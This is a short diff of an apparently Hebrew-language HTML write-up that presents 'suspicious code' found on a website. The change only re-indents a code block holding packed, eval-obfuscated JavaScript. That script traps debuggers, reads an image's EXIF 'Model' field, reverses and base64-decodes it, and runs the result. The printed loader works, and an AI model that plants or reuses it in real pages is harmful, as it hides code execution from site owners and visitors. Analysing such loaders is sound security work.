@@ -301,11 +301,10 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>בדיקה של קו
 של האתר מגלה את הקוד החשוד הבא:</span></p>
 
 ```html
-    <script src="./exif-js/exif.js"></script>
- 
-    <script>
-        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7(0(){9},c);"e 4";5.6=1;0 1(){8 a=b.3("d");2.f(a,0(){g(h(2.i(j,"k").l("").m().n("")))})}',24,24,'function|getExif|EXIF|getElementById|strict|window|onload|setInterval|var|debugger||document|100|profileImage|use|getData|eval|atob|getTag|this|Model|split|reverse|join'.split('|'),0,{}))
-    </script>
+<script src="./exif-js/exif.js"></script>
+<script>
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7(0(){9},c);"e 4";5.6=1;0 1(){8 a=b.3("d");2.f(a,0(){g(h(2.i(j,"k").l("").m().n("")))})}',24,24,'function|getExif|EXIF|getElementById|strict|window|onload|setInterval|var|debugger||document|100|profileImage|use|getData|eval|atob|getTag|this|Model|split|reverse|join'.split('|'),0,{}))
+</script>
 ```
 
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
